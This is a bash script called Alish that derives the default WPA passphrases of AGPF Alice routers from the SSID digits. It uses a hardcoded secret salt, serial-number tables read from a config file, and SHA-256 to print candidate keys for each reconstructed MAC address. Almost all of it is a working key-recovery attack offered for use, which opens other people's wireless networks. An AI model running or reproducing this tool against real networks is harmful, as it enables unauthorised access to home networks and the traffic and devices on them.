#!/bin/bash
VERSION='0.02'
CONFIG_PATHS=('/usr/share/aliwe/config.txt' '/mnt/sdcard/config.txt' 'config.txt')
OPENSSL=$(which sha256sum)
SNDARGLENGHT=8
SNDARG=$2
ALIS="\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8"
preinitcharset="0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123"

version() {
  printf 'Coded by Gianluca Boiano  -  v%s\n' "${VERSION}"
  exit 0
}

help() {
  printf '\nAlish   ---  A wpa passphrase generator script for AGPF Alice routers\n'
  printf 'usage: alish [<opts>]\n'
  printf '  <opts>  -h                       print this message\n'
  printf '          -r                       read from <config> file and print on console\n'
  printf '          -s  <SSID digits>        wpa passphrase generation based on SSID digits\n'
  printf '          -v                       display version information\n'
  exit 0
}

wpagen() {
  completemachex=$(echo -en $completemac | sed "s/[[:xdigit:]]\{2\}/\\\x&/g")
  digest=$(echo -en $ALIS$sn$completemachex | sha256sum)
  nicebytes=$(echo $digest | cut -c 1-48 | tr 'a-z' 'A-Z')
  hextobyte=$(echo $nicebytes | sed "s/[[:xdigit:]]\{2\}/\n&/g")
  indexarray=$(echo "ibase=16; obase=A; ${hextobyte}" | bc)

  for i in $indexarray; do
    a=$i
    b=$(echo $a + 1 | bc)
    wpa+=$(echo $preinitcharset | cut -c $b)
  done
}

ssid2mac() {
  for i in $(seq 0 2); do
    cyclefactor=$(echo "100000000*$i" | bc)
    thcycle=$(echo "$SNDARG+$cyclefactor" | bc)
    submac=$(printf '\n%2X', "$thcycle")
    normalized_submac=$(echo $submac | cut -c 2-7)
    completemac=$mac$normalized_submac
    printf '\nwith pad %i:\t\t' $i
    printf '%s\t\t\t' "$completemac"
    unset wpa
    wpagen
    printf "%s\n" $wpa
  done
}

read_file() {
  cat $FILE
  exit 0
}

generation() {
  lines=$(grep \"$searchvar $FILE)
  IFS=$';\n'
  for i in $lines; do
    if [ ${#i} -eq 29 ]; then # check on line lenght
      sn1=$(echo $i | cut -c 6-10)
      k=$(echo $i | cut -c 12)
      q=$(echo $i | cut -c 14-21)
      mac=$(echo $i | cut -c 23-28)
    else
      sn1=$(echo $i | cut -c 6-10)
      k=$(echo $i | cut -c 12-13)
      q=$(echo $i | cut -c 15-22)
      mac=$(echo $i | cut -c 24-29)
    fi

    num=$(echo "$SNDARG-$q" | bc)
    sn2=$(echo "$num/$k" | bc)
    sn=$(printf '%dX%07d' "$sn1" "$sn2")
    printf "\n\nSerial Number:\n"
    printf '%s' "$sn"
    printf "\n\nFor this SN you can have these MACs:\t\t\tand relative keys:\n"
    unset IFS
    ssid2mac
  done
  printf "\n"
}

ssid() {
  if [ -f $FILE ]; then
    if [ -z $SNDARG ]; then
      printf 'Missing parameter\n'
      exit 1
    elif [ ! ${#SNDARG} -eq $SNDARGLENGHT ]; then # ${#} returns the string lenght
      printf 'Please type 8 digits\n'
      exit 1
    fi
    searchvar=$(echo $SNDARG | cut -c 1-3)
    count=$(grep -c \"$searchvar $FILE) # obtain search occurrencies
    if [ $count -eq 0 ]; then
      printf 'No entry found in config file\n'
    else
      printf '%d entries found\n' "$count"
      printf "Summary for Alice-%s:" $SNDARG
      generation
    fi
  else
    printf 'File not found\n'
  fi
}

process_args() {
  # Process other arguments.
  case "$1" in
    -h) help ;;
    -r) read_file ;;
    -s) ssid ;;
    -v) version ;;
    -*) help ;;
    *) echo 'Please type -h for details' ;;
  esac
}

# Some preliminary checks
if [ ! -e $OPENSSL ]; then
  printf "OpenSSL executable not found. Please install it.\n"
  exit 1
fi

for dir in "${CONFIG_PATHS[@]}"; do
  if [ -f $dir ]; then
    break
  fi 
done
FILE=$dir

# Get arguments passed to the script. ##
process_args "$@"
